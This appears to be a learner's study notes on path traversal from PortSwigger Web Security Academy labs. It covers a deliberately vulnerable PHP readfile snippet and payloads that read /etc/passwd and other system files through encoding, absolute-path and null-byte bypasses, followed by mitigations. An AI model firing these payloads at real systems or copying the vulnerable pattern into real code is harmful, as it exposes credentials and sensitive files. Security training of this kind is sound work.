# Path Traversal

## PortSwigger Web Security Academy

Completed Labs:

- File path traversal, simple case
- File path traversal, traversal sequences blocked with absolute path bypass
- File path traversal, traversal sequences stripped non-recursively
- File path traversal, traversal sequences stripped with superfluous URL-decode
- File path traversal, validation of start of path
- File path traversal, validation of file extension with null byte bypass


## Vulnerability Overview

Path Traversal is a vulnerability that allows an attacker to access files and directories outside the intended application directory.

The vulnerability occurs when an application uses user-controlled input to build filesystem paths without properly validating the final location.


Example vulnerable code:

```php
$file = "/var/www/images/" . $_GET["filename"];

readfile($file);
```


An attacker may manipulate the filename parameter:

```
../../../etc/passwd
```


to access files outside the intended directory.


## Common Payloads

Basic traversal:

```
../../../etc/passwd
```


Absolute path:

```
/etc/passwd
```


Windows example:

```
..\..\windows\win.ini
```


Encoded traversal:

```
..%2f..%2f..%2fetc/passwd
```


Null byte bypass:

```
../../../etc/passwd%00.jpg
```


## Attack Techniques Covered


### Directory Traversal

Moving backwards in the filesystem hierarchy:

```
../
```


Example:

```
/var/www/images/../../../etc/passwd
```


### Absolute Path Bypass

Using the full path instead of relative traversal:

```
/etc/passwd
```


### Encoding Bypass

Using URL encoding to bypass filters:

```
..%2f
```


### Validation Bypass

Circumventing:

- Prefix validation
- Extension checks
- Blacklists


## Impact

Successful exploitation can lead to:

- Sensitive file disclosure
- Source code exposure
- Configuration theft
- Credential leakage
- Internal information disclosure


Sensitive targets may include:

```
/etc/passwd
```

```
/etc/shadow
```

```
application configuration files
```

```
database credentials
```


## Mitigation

Prevent Path Traversal by:

- Avoiding direct filesystem access with user input
- Using allowlists
- Normalizing paths before validation
- Restricting file access permissions
- Storing uploaded files outside executable directories
- Rejecting traversal sequences


## Skills Demonstrated

- Filesystem analysis
- Linux file structures
- Input validation testing
- Burp Suite manipulation
- Encoding bypass techniques
- Web application security testing
